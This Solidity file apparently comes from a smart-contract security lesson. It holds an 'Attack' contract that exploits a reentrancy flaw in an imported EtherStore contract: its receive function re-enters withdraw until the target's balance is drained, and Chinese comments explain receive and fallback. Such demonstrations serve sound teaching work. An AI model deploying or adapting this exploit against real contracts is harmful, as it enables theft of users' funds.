// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;

import "./EtherStore.sol";

contract Attack {

    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    //接收以太函数(推荐)
    receive() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw(1 ether);
        }
    }

    //fallback　函数始终会接收数据，但为了同时接收以太时，必须标记为　payable 。
//    fallback() external {
//        if (address(etherStore).balance >= 1 ether) {
//            etherStore.withdraw(1 ether);
//        }
//    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw(1 ether);
    }

    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
}
